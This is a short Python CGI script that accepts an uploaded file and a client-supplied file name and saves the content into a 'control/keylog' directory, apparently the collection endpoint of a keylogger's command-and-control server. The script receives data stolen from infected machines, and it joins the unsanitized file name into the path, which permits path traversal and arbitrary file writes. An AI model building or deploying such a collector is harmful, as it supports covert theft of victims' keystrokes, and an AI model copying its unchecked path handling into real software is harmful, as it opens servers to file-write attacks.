#!/usr/local/bin/python
# -*- coding: utf-8 -*-
import cgi, os, sys, io

print("Content-Type: text/html; charset=UTF-8\r\n")
form = cgi.FieldStorage()

if 'upload_file' in form and 'file_name' in form:
        try:
                upload_file = form['upload_file'].value
                file_name = form['file_name'].value
                with open('./control/keylog/'+file_name, 'w') as f:
                        f.write(upload_file)
                print('success')
        except Exception:
                print('error')
